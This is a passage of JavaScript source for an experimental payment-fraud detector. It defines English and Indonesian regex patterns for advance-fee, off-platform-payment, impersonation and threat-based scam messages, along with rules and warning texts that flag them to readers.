    // Informal amounts without a currency sign ("50rb", "2jt", "100k"): only an object when a pay verb is in the same block.
    entry3("pay.amount.informal", "PA.AMOUNT", "id", "strong", `${B}\\d[\\d.,]*\\s?(?:rb|rbu|ribu|ewu|jt|juta|k)${E}`, ["50rb", "2jt", "100k", "150 ribu", "20ewu", "20 rbu"]),
    entry3("pay.en.fee", "PF.FEE", "en", "weak", `${B}(?:fees?|surcharges?|charges?)${E}`, ["fee", "charges"]),
    entry3("pay.id.fee", "PF.FEE", "id", "weak", `${B}(?:biaya|ongkos(?:\\s+kirim)?|ongkir|pajak|pembayaran\\s+administrasi|saldo\\s+tugas)${E}`, ["biaya", "ongkir", "pajak", "pembayaran administrasi", "saldo tugas"]),
    // A fee whose stated purpose is to release, unlock or hand over something: the core of advance-fee fraud.
    entry3(
      "pay.en.release_fee",
      "PF.RELEASE_FEE",
      "en",
      "strong",
      `${B}(?:(?:account\\s+)?(?:verification|unlock(?:ing)?|unblock(?:ing)?|reactivation|account\\s+activation|release|clearance|anti-?money\\s+laundering|aml)\\s+(?:fees?|charges?|deposits?|tax(?:es)?)|(?:prize|winnings|lottery)\\s+(?:tax(?:es)?|fees?)|(?:tax(?:es)?|fees?)\\s+on\\s+(?:your\\s+)?(?:prize|winnings))${E}`,
      ["verification fee", "unlock fee", "release fee", "clearance fee", "prize tax", "tax on your winnings"]
    ),
    entry3(
      "pay.id.release_fee",
      "PF.RELEASE_FEE",
      "id",
      "strong",
      `${B}(?:biaya\\s+(?:verifikasi|aktivasi\\s+akun|buka\\s+blokir|pembukaan\\s+blokir|pencairan|pelepasan|klaim(?:\\s+hadiah)?|pengurusan\\s+hadiah)|pajak\\s+(?:hadiah|undian|pemenang)|biaya\\s+validasi|deposit\\s+aktivasi|uang\\s+jaminan|(?:dengan\\s+)?syarat\\s+biaya\\s+(?:admin(?:istrasi)?|pendaftaran)|biaya\\s+(?:seragam|id\\s*card)|(?:pembayaran\\s+)?(?:kaos\\s+)?seragam\\s+karyawan)${E}`,
      ["biaya verifikasi", "biaya buka blokir", "biaya pencairan", "pajak hadiah", "uang jaminan", "syarat biaya admin", "pembayaran kaos seragam karyawan"]
    )
  ], DESTINATIONS = [
    // "your personal account" is the reader's own account (ordinary banking), so only someone else's personal account counts.
    entry3(
      "pay.en.personal",
      "PD.PERSONAL",
      "en",
      "strong",
      `${B}(?:my|his|her|their|this|(?:the|our|an?)\\s+agent${APOS}s)\\s+(?:personal|private|own)\\s+(?:bank\\s+)?(?:account|wallet)${E}`,
      ["my personal account", "the agent's personal account"]
    ),
    entry3(
      "pay.id.personal",
      "PD.PERSONAL",
      "id",
      "strong",
      `${B}rekening\\s+(?:(?:pribadi|perorangan)(?!\\s+(?:anda|kamu))(?:\\s+(?:saya|kami|admin|petugas|agen))?|(?:saya|admin|petugas|agen|kurir|ajudan|staf|sekretaris))${E}`,
      ["rekening pribadi saya", "rekening pribadi", "rekening admin"]
    ),
    entry3(
      "pay.id.personal_informal",
      "PD.PERSONAL",
      "id",
      "strong",
      `${B}(?:rek\\.?|norek|rekening)\\s+(?:admin|sy|aku|gw|gue|petugas|agen|kurir)${E}|${B}(?:dana|ovo|gopay|shopeepay|e-?wallet)\\s+(?:saya|sy|aku|gw|gue|admin|petugas)${E}`,
      ["rek admin", "norek sy", "dana sy", "ovo admin"]
    ),
    entry3(
      "pay.id.personal_wallet",
      "PD.PERSONAL",
      "id",
      "strong",
      `${B}(?:e-?wallet\\s+)?(?:dana|ovo|gopay|shopeepay|linkaja)\\s+\\+?\\d[\\d\\s-]{8,}\\d${E}|${B}(?:a\\s?/\\s?n|a\\.n|atas\\s+nama)[\\s.:;]+(?!(?:pt|cv|yayasan|koperasi|bank|perusahaan|(?:anda|kamu|mas|mbak|kak|kakak|bapak|ibu|bpk|penerima|pengirim)(?:nya)?)${E})\\p{L}`,
      ["E-WALLET DANA 081200000000", "A/N Budi", "A/n.RASTO"]
    ),
    // A phone number given as where to send phone credit or money ("pulsa ke nomor baru ini 0812…").
    entry3(
      "pay.id.personal_phone",
      "PD.PERSONAL",
      "id",
      "strong",
      `${B}(?:ke|di|kana)\\s+(?:no(?:mor|mer)?\\.?|nmr|hp)\\s*(?:\\p{L}+[\\s,:]+){0,2}?\\+?\\d[\\d\\s-]{8,}\\d${E}`,
      ["ke no 081200000000", "di nomor baru ini 0812 0000 0000"]
    ),
    // A bare account or phone number as where to send the money ("transfer … ke 1234567890").
    entry3("pay.id.bare_account", "PD.PERSONAL", "id", "strong", `${B}ke\\s+(?:rek(?:ening)?\\.?\\s*)?\\d[\\d\\s-]{7,}\\d${E}`, ["ke 1234567890", "ke rekening 1234 5678 90"]),
    // Payment redirected to another person who "has been authorized" (rent, instalments).
    entry3(
      "pay.id.proxy_payee",
      "PD.PERSONAL",
      "id",
      "strong",
      `${B}(?:(?:sudah|sdh|dh|telah)\\s+(?:(?:saya|sy|aku)\\s+)?(?:di\\s?)?kuasakan|di\\s?kuasakan(?:\\s+sepenuhnya)?|(?:perubahan|ganti|pergantian)\\s+(?:no(?:mor)?\\.?\\s*)?rek(?:ening)?)${E}`,
      ["sudah dikuasakan", "sdh dikuasakan", "ada perubahan no rekening"]
    ),
    entry3(
      "pay.en.off_platform",
      "PD.OFF_PLATFORM",
      "en",
      "strong",
      `${B}(?:(?:outside|off)\\s+(?:of\\s+)?(?:the\\s+|this\\s+)?(?:app|platform|marketplace|website|site|escrow)|directly\\s+to\\s+(?:me|my\\s+(?:account|number|wallet))|(?:skip|avoid|bypass|instead\\s+of)\\s+(?:using\\s+)?(?:the\\s+)?(?:checkout|escrow|platform\\s+payment|app\\s+payment))${E}`,
      ["outside the app", "directly to me", "instead of using the checkout"]
    ),
    entry3(
      "pay.id.off_platform",
      "PD.OFF_PLATFORM",
      "id",
      "strong",
      `${B}(?:di\\s+luar\\s+(?:aplikasi|platform|marketplace|situs|rekber)|langsung\\s+ke\\s+(?:saya|rekening\\s+saya|nomor\\s+saya)|tanpa\\s+(?:melalui|lewat)\\s+(?:aplikasi|platform|checkout|rekber)|(?:transfer|tf)\\s+langsung)${E}`,
      ["di luar aplikasi", "langsung ke saya", "tanpa melalui aplikasi", "transfer langsung"]
    ),
    entry3(
      "pay.en.gift_card",
      "PD.GIFT_CARD",
      "en",
      "strong",
      `${B}(?:gift\\s*cards?|google\\s+play\\s+(?:gift\\s+)?cards?|itunes\\s+cards?|steam\\s+(?:gift\\s+|wallet\\s+)?cards?)${E}`,
      ["gift card", "Google Play cards"]
    ),
    entry3(
      "pay.id.gift_card",
      "PD.GIFT_CARD",
      "id",
      "strong",
      `${B}(?:kartu\\s+hadiah|voucher\\s+(?:google\\s+play|steam|itunes))${E}`,
      ["kartu hadiah", "voucher Google Play"]
    ),
    entry3(
      "pay.en.crypto",
      "PD.CRYPTO",
      "en",
      "strong",
      `${B}(?:bitcoin|btc|usdt|crypto(?:currency)?(?:\\s+wallet)?|wallet\\s+address)${E}`,
      ["bitcoin", "USDT", "wallet address"]
    ),
    entry3("pay.id.crypto", "PD.CRYPTO", "id", "strong", `${B}(?:aset\\s+kripto|kripto|alamat\\s+dompet)${E}`, ["kripto", "alamat dompet"])
  ], RECEIVE = [
    entry3(
      "pay.en.refund",
      "PR.REFUND",
      "en",
      "weak",
      `${B}(?:refunds?|reimbursement|compensation|overpayment|(?:release|unfreeze)\\s+(?:your\\s+|the\\s+)?(?:funds|money|payment|package|parcel|shipment)|(?:funds|money|payment|package|parcel)\\s+(?:is|are|has\\s+been|have\\s+been)\\s+(?:on\\s+hold|held|frozen))${E}`,
      ["refund", "compensation", "release your funds", "package is on hold"]
    ),
    entry3(
      "pay.id.refund",
      "PR.REFUND",
      "id",
      "weak",
      `${B}(?:pengembalian\\s+dana|refund|ganti\\s+rugi|kompensasi|kelebihan\\s+(?:bayar|pembayaran)|(?:dana|paket)(?:\\s+(?:anda|kamu))?\\s+(?:tertahan|dibekukan|ditahan)|(?:pencairan|mencairkan)\\s+dana|(?:dana|komisi|saldo)\\s+(?:pada|di|dalam|dari)?\\s*(?:[\\p{L}]+\\s+){0,4}?(?:tertahan|dibekukan|ditahan))${E}`,
      ["pengembalian dana", "dana pada akun email tertahan", "komisi pekerjaan tertahan", "kompensasi", "dana Anda tertahan", "pencairan dana"]
    ),
    entry3(
      "pay.id.release_informal",
      "PR.REFUND",
      "id",
      "weak",
      `${B}(?:saldo|bonus|hadiah|dana|uang|cashback|komisi)\\s+(?:[\\p{L}\\d]+\\s+){0,4}?(?:siap\\s+|bisa\\s+|langsung\\s+)?(?:dicair(?:kan|in)|cair|ditarik|withdraw)${E}`,
      ["saldo bonus 2jt kakak udah siap dicairin", "komisi bisa ditarik"]
    ),
    entry3(
      "pay.en.prize",
      "PR.PRIZE",
      "en",
      "weak",
      `${B}(?:you(?:${APOS}ve|\\s+have)?\\s+(?:won|been\\s+selected)|(?:lucky|selected)\\s+winner|your\\s+(?:prize|winnings|reward)|claim\\s+(?:your\\s+)?(?:prize|winnings|reward)|grand\\s+prize|lottery\\s+winnings?)${E}`,
      ["you've won", "lucky winner", "claim your prize"]
    ),
    entry3(
      "pay.id.prize",
      "PR.PRIZE",
      "id",
      "weak",
      `${B}(?:anda\\s+(?:telah\\s+|resmi\\s+)?(?:memenangkan|terpilih|menang|mendapatkan\\s+hadiah)|pemenang(?:\\s+(?:undian|program|giveaway))?|hadiah\\s+(?:undian|utama|anda|uang\\s+tunai)|klaim\\s+hadiah|undian\\s+berhadiah)${E}`,
      ["Anda memenangkan", "pemenang undian", "hadiah utama", "klaim hadiah"]
    ),
    // A guaranteed place in a selection (recruitment, admission) is never sold: paying for it is the scam (P2, D-087).
    entry3(
      "pay.id.recruit",
      "PR.RECRUIT",
      "id",
      "strong",
      `${B}(?:(?:dijamin|pasti|100\\s?%)\\s+(?:lulus|lolos|diterima|masuk)|jalur\\s+(?:khusus|belakang|titipan|orang\\s+dalam)\\s+(?:masuk|seleksi|pendaftaran|penerimaan|rekrutmen|bintara|tamtama|akmil|akpol|polri|tni|cpns|pns|kedinasan)|(?:lewat|melalui|via)\\s+jalur\\s+(?:belakang|titipan|orang\\s+dalam)|uang\\s+(?:pelicin|titipan\\s+(?:seleksi|masuk))|orang\\s+dalam|jaminan\\s+100\\s?%|tanpa\\s+(?:tes|test|seleksi|interview|wawancara)(?:\\s+(?:ataupun|atau|maupun|dan)\\s+(?:tes|test|interview|wawancara))?|langsung\\s+(?:ttd|tanda\\s+tangan)\\s+kontrak)${E}`,
      ["dijamin lulus", "jalur khusus seleksi bintara", "lewat jalur belakang", "uang pelicin", "orang dalam", "tanpa Tes ataupun Interview", "JAMINAN 100%"]
    ),
    // A job offer: something the reader is promised to receive. A fee or purchase required for it is pay-to-receive (pay-0.4.0).
    entry3(
      "pay.id.job",
      "PR.JOB",
      "id",
      "weak",
      `${B}(?:panggilan\\s+kerja|lowongan(?:\\s+kerja)?|karyawan\\s+baru|calon\\s+(?:karyawan|pekerja|mitra)|diterima\\s+(?:kerja|bekerja)|siap\\s+kerja|kerja\\s+(?:di\\s?sini|besok)|(?:pekerjaan|kerja)\\s+(?:online|sampingan|paruh\\s+waktu)|part[\\s-]?time|tugas\\s+(?:online|harian|like|follow|review|rating|vip|premium)|komisi\\s+(?:tugas|pekerjaan|harian)|(?:nonton|tonton|menonton)\\s+(?:iklan|video))${E}`,
      ["Panggilan kerja", "pekerjaan online", "tugas like", "komisi pekerjaan", "lowongan", "karyawan baru", "calon mitra", "siap kerja"]
    ),
    entry3(
      "pay.en.job",
      "PR.JOB",
      "en",
      "weak",
      `${B}(?:job\\s+offer|you(?:${APOS}ve|\\s+have)\\s+been\\s+(?:hired|selected\\s+for\\s+the\\s+(?:job|position))|new\\s+(?:hire|employee)s?|(?:work|job)\\s+from\\s+home\\s+(?:job|position))${E}`,
      ["job offer", "you've been hired", "new employees"]
    ),
    // A guaranteed or fixed investment return: a percentage per day or week, a profit that is "fixed", "certain" or "guaranteed",
    // capital that "doubles", an investment "without risk" (D-102). Interest per month or year (deposits, loans) is not matched.
    entry3(
      "pay.id.invest",
      "PR.INVEST",
      "id",
      "strong",
      `${B}(?:(?:keuntungan|profit|untung|cuan|hasil)\\s+(?:harian\\s+)?(?:tetap|pasti|dijamin|terjamin|konsisten)|\\d+(?:[.,]\\d+)?\\s?%\\s*(?:per|tiap|setiap|/)\\s*(?:hari|minggu|pekan)|(?:modal|dana|uang)\\s+(?:\\p{L}+\\s+){0,2}?(?:dijamin\\s+)?(?:berlipat(?:\\s+ganda)?|kembali\\s+\\d+\\s?(?:x|kali))|(?:investasi|modal|dana)\\s+(?:\\p{L}+\\s+){0,3}?(?:tanpa|bebas|nol)\\s+risiko|(?:pasti|dijamin)\\s+(?:untung|profit|cuan))${E}`,
      ["keuntungan tetap", "profit 5% per hari", "modal dijamin berlipat", "investasi tanpa risiko", "pasti untung"]
    ),
    entry3(
      "pay.en.invest",
      "PR.INVEST",
      "en",
      "strong",
      `${B}(?:guaranteed\\s+(?:returns?|profits?|income|daily\\s+(?:returns?|profits?))|(?:fixed|daily)\\s+(?:returns?|profits?)|\\d+(?:\\.\\d+)?\\s?%\\s*(?:daily|per\\s+day|a\\s+day|per\\s+week|weekly)|risk[\\s-]free\\s+(?:investment|returns?|profits?)|double\\s+your\\s+(?:money|investment|capital))${E}`,
      ["guaranteed returns", "3% daily", "risk-free investment", "double your money"]
    ),
    // A loan that is "approved" or "sure to be disbursed" without checks (D-103): a promise; a fee tied to it by a condition is PR1.
    entry3(
      "pay.id.loan",
      "PR.LOAN",
      "id",
      "weak",
      `${B}(?:(?:pengajuan\\s+)?(?:pinjaman|kredit)\\s+(?:\\p{L}+\\s+){0,3}?(?:telah\\s+|sudah\\s+)?(?:disetujui|di-?acc|pasti\\s+cair|langsung\\s+cair|cepat\\s+cair|siap\\s+(?:di)?cair(?:kan)?)|pengajuan\\s+(?:anda|kamu)\\s+(?:telah\\s+|sudah\\s+)?(?:disetujui|di-?acc)|tanpa\\s+(?:bi\\s+checking|slik(?:\\s+ojk)?|agunan|survei|survey)|pasti\\s+(?:cair|acc|disetujui))${E}`,
      ["pengajuan pinjaman Anda disetujui", "pinjaman online pasti cair", "tanpa BI checking", "dana pinjaman sudah siap dicairkan"]
    ),
    entry3(
      "pay.en.loan",
      "PR.LOAN",
      "en",
      "weak",
      `${B}(?:(?:your\\s+)?loan\\s+(?:application\\s+)?(?:has\\s+been\\s+|is\\s+)?(?:approved|ready\\s+(?:for|to\\s+be)\\s+disburse(?:ment|d))|guaranteed\\s+(?:loan\\s+)?approval|no\\s+credit\\s+check)${E}`,
      ["your loan has been approved", "guaranteed approval", "no credit check"]
    ),
    entry3(
      "pay.en.recruit",
      "PR.RECRUIT",
      "en",
      "strong",
      `${B}(?:guaranteed\\s+(?:to\\s+pass|admission|acceptance|a\\s+(?:place|spot|seat))|back[\\s-]?door\\s+(?:entry|admission|route)|special\\s+(?:quota|route)\\s+for\\s+(?:a\\s+)?fee)${E}`,
      ["guaranteed to pass", "backdoor admission"]
    ),
    entry3(
      "pay.en.unlock",
      "PR.UNLOCK",
      "en",
      "weak",
      `${B}(?:(?:unlock|unblock|reactivate|re-activate|restore|reopen|unfreeze)\\s+(?:your\\s+|the\\s+)?(?:account|wallet|card|access|profile|withdrawals?)|(?:verify|activate)\\s+(?:your\\s+)?(?:account|wallet))${E}`,
      ["unlock your account", "reactivate your wallet", "verify your account"]
    ),
    entry3(
      "pay.id.unlock",
      "PR.UNLOCK",
      "id",
      "weak",
      `${B}(?:buka\\s+blokir|membuka\\s+blokir|aktivasi(?:\\s+ulang)?|mengaktifkan(?:\\s+kembali)?|memulihkan|pemulihan|verifikasi)\\s+(?:akun|rekening|dompet|kartu|saldo)${E}`,
      ["buka blokir akun", "aktivasi ulang akun", "verifikasi akun"]
    ),
    entry3(
      "pay.id.unlock_informal",
      "PR.UNLOCK",
      "id",
      "weak",
      `${B}(?:buka|bka|aktifin|aktifkan|pulihin|balikin)\\s+(?:lagi\\s+)?akun(?:nya|\\s+(?:kamu|lu|lo|kakak|kak))?${E}`,
      ["buka akunnya", "aktifin lagi akun kamu"]
    ),
    // The clause that makes the payment a precondition for receiving something.
    entry3(
      "pay.en.condition",
      "PC.CONDITION",
      "en",
      "weak",
      `${B}(?:(?:in\\s+order\\s+)?to|before\\s+(?:we|you)\\s+can|so\\s+(?:that\\s+)?(?:we|you)\\s+can|for\\s+us\\s+to)\\s+(?:receive|claim|release|unlock|unblock|reactivate|activate|withdraw|collect|redeem|restore|recover|unfreeze|process\\s+(?:your\\s+|the\\s+)?(?:refund|prize|withdrawal))${E}`,
      ["to receive", "to claim", "before we can release", "to process your refund"]
    ),
    entry3(
      "pay.id.condition",
      "PC.CONDITION",
      "id",
      "weak",
      `${B}(?:(?:agar|supaya|untuk|sebelum|baru)\\s+(?:(?:dapat|bisa)\\s+)?(?:menerima|mencairkan|dicairkan|mengklaim|diklaim|membuka|dibuka|mengaktifkan|diaktifkan|menarik|ditarik|memulihkan|dipulihkan|dilepas|mengambil|diambil|diproses|dikirim|ditransfer)|(?:terlebih|lebih)\\s+dahulu|dulu|dl|duluan|(?:agar|supaya)\\s+(?:dana|uang|saldo|hadiah|paket|pinjaman|komisi)(?:nya)?\\s+(?:(?:dapat|bisa)\\s+)?(?:dicairkan|cair|ditransfer|dikirim|masuk|diproses)|sebelum\\s+(?:mulai|memulai|bekerja)|untuk\\s+(?:mulai|memulai)\\s+(?:tugas|bekerja|kerja)|(?:cair(?:kan)?|ditarik|tarik)\\s+setelah|(?:setelah|sesudah)\\s+(?:deposit|top\\s*-?up|isi\\s+saldo))${E}`,
      ["agar dapat dicairkan", "untuk mengambil", "terlebih dahulu", "cairkan setelah deposit", "agar dana bisa ditransfer", "dulu", "untuk mencairkan", "supaya bisa dibuka"]
    ),
    entry3(
      "pay.id.condition_obligation",
      "PC.CONDITION",
      "id",
      "weak",
      `${B}(?:(?:di)?wajib(?:kan)?\\s+(?:membeli|membayar|dibayar(?:kan)?|bayar)|dengan\\s+syarat|sebagai\\s+syarat|(?:harus|wajib)\\s+(?:sudah\\s+)?di\\s?bayar(?:kan)?)${E}`,
      ["wajib membeli", "diwajibkan dibayarkan", "dengan syarat", "harus sudah di bayarkan"]
    ),
    entry3(
      "pay.id.condition_informal",
      "PC.CONDITION",
      "id",
      "weak",
      `${B}(?:(?:abis|habis|setelah|sesudah)\\s+(?:itu|bayar|transfer|tf)|baru(?:\\s+(?:bisa|dapat))?)\\s+(?:langsung\\s+)?(?:cair|dicair(?:kan|in)|masuk|dikirim|aktif|dibuka|kebuka)${E}`,
      ["abis itu langsung cair", "setelah transfer langsung masuk", "baru bisa cair"]
    ),
    entry3(
      "pay.en.condition_after",
      "PC.CONDITION",
      "en",
      "weak",
      `${B}(?:then|after\\s+that|once\\s+(?:paid|you\\s+pay))\\s+(?:your\\s+)?(?:funds|money|prize|refund|balance|parcel|package|account)\\s+(?:will\\s+be\\s+)?(?:released|sent|unlocked|credited|delivered)${E}`,
      ["then your funds will be released", "once paid your parcel will be delivered"]
    )
  ], PRESSURE = [
    entry3(
      "pay.en.threat",
      "PP.THREAT",
      "en",
      "weak",
      `${B}(?:(?:account|wallet|card|access|profile|funds|number|sim)\\s+(?:will\\s+be|has\\s+been|is\\s+being|may\\s+be)\\s+(?:permanently\\s+)?(?:suspended|locked|blocked|disabled|deactivated|closed|terminated|frozen|restricted|seized)|(?:will|may|could)\\s+be\\s+(?:arrested|prosecuted|sued|charged|jailed|detained|deported)|arrest\\s+warrant|warrant\\s+for\\s+your\\s+arrest|(?:face|facing)\\s+(?:legal\\s+action|prosecution|criminal\\s+charges|arrest)|legal\\s+action\\s+(?:will|against\\s+you))${E}`,
      ["account will be suspended", "will be arrested", "warrant for your arrest", "face legal action"]
    ),
    entry3(
      "pay.id.threat",
      "PP.THREAT",
      "id",
      "weak",
      `${B}(?:(?:akun|rekening|kartu|dompet|saldo|nomor)(?:\\s+(?:anda|kamu))?\\s+(?:akan\\s+|telah\\s+|sudah\\s+)?(?:di)?(?:blokir|nonaktifkan|tutup|bekukan|sita|tangguhkan)|akan\\s+(?:di)?(?:tangkap|penjarakan|pidanakan|polisikan|proses\\s+(?:secara\\s+)?hukum|laporkan\\s+ke\\s+(?:polisi|pihak\\s+berwajib))|surat\\s+(?:penangkapan|perintah\\s+penangkapan)|terancam\\s+(?:pidana|penjara|ditangkap)|untuk\\s+menghindari\\s+(?:pemblokiran|penonaktifan|penutupan|denda)|(?:data|foto|video)\\s+(?:\\p{L}+\\s+){0,2}?(?:akan\\s+)?(?:disebar(?:kan)?|dipublikasikan|diviralkan|dibocorkan)|agar\\s+(?:data|foto|video)\\s+(?:\\p{L}+\\s+)?(?:tidak|tdk|ora)\\s+(?:disebar(?:kan)?|dipublikasikan|diviralkan|dibocorkan)|(?:sebelum\\s+)?paket\\s+(?:akan\\s+)?(?:dikembalikan|dimusnahkan))${E}`,
      ["akun Anda akan diblokir", "untuk menghindari pemblokiran", "data pribadi Anda akan disebarkan", "sebelum paket dikembalikan", "akan ditangkap", "terancam pidana"]
    ),
    entry3(
      "pay.id.threat_informal",
      "PP.THREAT",
      "id",
      "weak",
      `${B}(?:(?:ke|ter)hapus\\s+permanen|kena\\s+(?:blokir|banned|suspend)|(?:bakal|mau)\\s+(?:di)?(?:blokir|hapus|banned|suspend))${E}`,
      ["kehapus permanen", "kena blokir", "bakal diblokir"]
    ),
    // Deadlines in minutes or hours and explicit pressure. "Expires in / valid for" on real payment links is excluded.
    entry3(
      "pay.en.urgency",
      "PP.URGENCY",
      "en",
      "weak",
      `${B}(?:(?<!(?:expires?|valid\\s+for|valid)\\s)within\\s+\\d+\\s+(?:minutes?|mins?|hours?|hrs?)|immediately|right\\s+now|act\\s+now|urgent(?:ly)?|as\\s+soon\\s+as\\s+possible|before\\s+it${APOS}?s\\s+too\\s+late|final\\s+warning|last\\s+chance)${E}`,
      ["within 2 hours", "immediately", "urgent", "final warning"]
    ),
    entry3(
      "pay.id.urgency",
      "PP.URGENCY",
      "id",
      "weak",
      `${B}(?:(?<!(?:berlaku|kedaluwarsa|kadaluarsa|hangus)\\s)dalam\\s+(?:waktu\\s+)?\\d+\\s+(?:menit|jam)|segera|sekarang\\s+juga|hari\\s+ini\\s+juga|peringatan\\s+terakhir|mendesak|secepatnya|kesempatan\\s+terakhir)${E}`,
      ["dalam 30 menit", "segera", "sekarang juga", "secepatnya"]
    ),
    entry3(
      "pay.id.urgency_informal",
      "PP.URGENCY",
      "id",
      "weak",
      `${B}(?:buruan|cepetan|cpt|penting|jangan\\s+(?:telepon|telpon|tlp|nelpon|telfon)|usahakan\\s+hari\\s+ini|sebelum\\s+jam\\s+\\d+|sampe\\s+jam\\s+\\d+|slot(?:nya)?\\s+(?:cuma|terbatas)|(?:paling\\s+lambat\\s+)?malam\\s+ini|(?:lowongan|kuota)\\s+(?:hanya|cuma)\\s+untuk\\s+\\d+|(?:tidak|tdk|ora|tanpa)\\s+(?:perlu\\s+)?(?:konfirmasi|verifikasi|cek)(?:\\s+(?:ulang|lagi|lembaga))?|jangan\\s+(?:tanya|bertanya|konfirmasi|cek)(?:\\s+(?:ke\\s+)?(?:lembaga|siapa|pihak))?)${E}`,
      ["buruan", "cpt", "sampe jam 12", "slotnya cuma", "malam ini", "lowongan hanya untuk 2", "tidak perlu konfirmasi ulang", "tanpa perlu verifikasi", "jangan tanya lembaga"]
    ),
    // Claimed identity or authority. Never verified; never escalates on its own.
    entry3(
      "pay.en.authority",
      "PP.AUTHORITY",
      "en",
      "weak",
      `${B}(?:customer\\s+(?:support|service|care)(?:\\s+(?:team|agent|officer|representative))?|support\\s+(?:team|agent|staff|desk)|help\\s*desk|(?:security|fraud|billing|compliance|verification)\\s+(?:team|department|officer|agent)|bank\\s+(?:officer|representative|staff|manager)|police(?:\\s+(?:officer|department))?|customs\\s+(?:office|officer|department|authority)|tax\\s+(?:office|officer|authority|department)|court\\s+(?:officer|order)|(?:government|federal)\\s+agent|official\\s+(?:support|agent|representative|account))${E}`,
      ["customer service", "support agent", "fraud department", "police officer", "customs officer"]
    ),
    entry3(
      "pay.id.authority",
      "PP.AUTHORITY",
      "id",
      "weak",
      `${B}(?:customer\\s+service|cs\\s+resmi|layanan\\s+pelanggan|petugas(?:\\s+(?:bank|resmi|bea\\s+cukai|pajak|kepolisian|kurir|ekspedisi))?|pihak\\s+(?:bank|kepolisian|bea\\s+cukai|berwajib)|polisi|kepolisian|bea\\s+cukai|kantor\\s+pajak|admin\\s+resmi|tim\\s+(?:keamanan|resmi|verifikasi)|kurir\\s+resmi)${E}`,
      ["customer service", "petugas bank", "pihak kepolisian", "bea cukai"]
    ),
    // Ranks and positions used to impersonate officials (P2, D-087): a claim only, never verified.
    entry3("pay.id.authority_rank", "PP.AUTHORITY", "id", "weak", `${B}(?:dandim|danrem|pangdam|danyon|danramil|kapolres|kapolda|kapolsek|kasdam|ajudan|babinsa|perwira|komandan|kolonel|letkol|mayor|kapten|lettu|letda|jenderal|brigjen|sertu|serka|pejabat|staf\\s+ahli|penyidik|bagian\\s+penyidikan|pimpinan|atasan)${E}`, ["Dandim", "ajudan", "Kapten", "penyidik", "pimpinan"]),
    // A message that claims to come from a family member on a new number ("ini nomor baru papa"), or opens by addressing a parent.
    entry3(
      "pay.id.family",
      "PP.FAMILY",
      "id",
      "weak",
      `${B}(?:ini\\s+(?:no(?:mor|mer)?|nmr)\\s+baru(?:\\s+(?:papa|mama|ayah|ibu|bapak|mamah|bunda|om|tante|kakak|adik|aku|saya))?|no(?:mor|mer)?\\s+baru(?:ku|\\s+(?:papa|mama|ayah|ibu|aku|saya))|^(?:ma|mah|mama|mamah|pa|pah|papa|yah|ayah|bu|ibu|bunda|bun)(?=[\\s,'"\u201D!.:]))${E}`,
      ["ini nomor baru papa", "no baruku", "ma, isi dl pulsa"]
    ),
    entry3("pay.en.authority_rank", "PP.AUTHORITY", "en", "weak", `${B}(?:colonel|captain|lieutenant|commanding\\s+officer|commander|investigator|detective)${E}`, ["colonel", "investigator"])
  ], OWN_CONTEXT2 = [
    entry3("pay.id.awareness", "C.EDUCATIONAL", "id", "strong", AWARENESS_ID, AWARENESS_ID_EXAMPLES),
    entry3("pay.id.impersonation_report", "C.REPORTED", "id", "strong", IMPERSONATION_REPORT_ID, IMPERSONATION_REPORT_ID_EXAMPLES)
  ], SHARED_CONTEXT2 = LEXICON.filter((e) => e.signal === "C.NEGATION" || e.signal === "C.REPORTED" || e.signal === "C.EDUCATIONAL").map((e) => ({ ...e, signal: e.signal })), PAY_LEXICON = [...REQUESTS, ...OBJECTS, ...DESTINATIONS, ...RECEIVE, ...PRESSURE, ...OWN_CONTEXT2, ...SHARED_CONTEXT2], PAY_OWN_LEXICON = [...REQUESTS, ...OBJECTS, ...DESTINATIONS, ...RECEIVE, ...PRESSURE];

  // src/core/payment/analyze.ts
  var PAY_DETECTOR_VERSION = "pay-0.8.0-exp", CLAUSE_BREAK3 = new RegExp("[,;:!?]|\\.(?=\\s|$)|(?<![\\p{L}\\p{N}_])(?:and|then|or|but|dan|lalu|kemudian|atau|tapi|tetapi)(?![\\p{L}\\p{N}_])", "u"), SENTENCE_BREAK3 = /[!?]|\.(?=\s|$)/u, TIERS3 = ["observed_instruction", "suspicious_correlation", "manipulative_instruction"], LEVELS3 = ["low", "medium", "high"], EDUCATIONAL3 = LEXICON.filter((e) => e.signal === "C.EDUCATIONAL"), DESTINATION_OF = {
    "PD.PERSONAL": "personal-account",
    "PD.OFF_PLATFORM": "off-platform",
    "PD.GIFT_CARD": "gift-card",
    "PD.CRYPTO": "crypto"
  }, PROMISE_OF = {
    "PR.REFUND": "refund",
    "PR.PRIZE": "prize",
    "PR.UNLOCK": "account-unlock",
    "PF.RELEASE_FEE": "release",
    "PR.RECRUIT": "recruitment",
    "PR.JOB": "job",
    "PR.INVEST": "investment-return",
    "PR.LOAN": "loan"
  }, PRESSURE_OF = { "PP.THREAT": "threat", "PP.URGENCY": "urgency", "PP.AUTHORITY": "claimed-authority", "PP.FAMILY": "claimed-family" }, ORDER = ["refund", "prize", "account-unlock", "release", "recruitment", "job", "investment-return", "loan", "personal-account", "off-platform", "gift-card", "crypto", "claimed-authority", "claimed-family", "threat", "urgency"], ordered = (xs) => [...new Set(xs)].sort((a, b) => ORDER.indexOf(a) - ORDER.indexOf(b)), PAY_RULES = {
    PR1: { name: "ADVANCE_FEE_TO_RECEIVE", classification: "manipulative_instruction" },
    PR2: { name: "OFF_CHANNEL_PAYMENT", classification: "manipulative_instruction" },
    PR3: { name: "PAYMENT_UNDER_THREAT", classification: "manipulative_instruction" },
    PR4: { name: "OBSERVED_PAYMENT_REQUEST", classification: "observed_instruction" }
  }, SUMMARY3 = {
    PR1: "This part of the page asks the reader to pay first in order to receive something (a refund, a prize, released funds or an unlocked account). Legitimate refunds and prizes do not require an upfront payment.",
    PR2: "This part of the page asks the reader to pay outside an ordinary checkout: to a personal account, off the platform, with gift cards or with cryptocurrency, together with pressure.",
    PR3: "This part of the page asks for a payment together with a threat (account closure, arrest or legal action) and urgency or a claimed authority.",
    PR4: "A request to pay was found with no manipulation signs nearby (for example, a checkout, an invoice or a donation)."
  };
  function kindOfSignal2(s) {
    return s === "PY.PAY" ? "request" : s.startsWith("PA.") || s.startsWith("PF.") ? "object" : s.startsWith("PD.") ? "destination" : s.startsWith("PR.") || s.startsWith("PC.") ? "receive" : s.startsWith("PP.") ? "pressure" : "context";
  }
  function reportedText(signal, text) {
    return signal === "PA.AMOUNT" ? "" : text.replace(/\d(?:[\d\s-]{7,}\d)|\d{5,}/gu, (d) => d.replace(/\d/gu, "\u2022"));
  }
  function match2(src) {
    let raw = [];
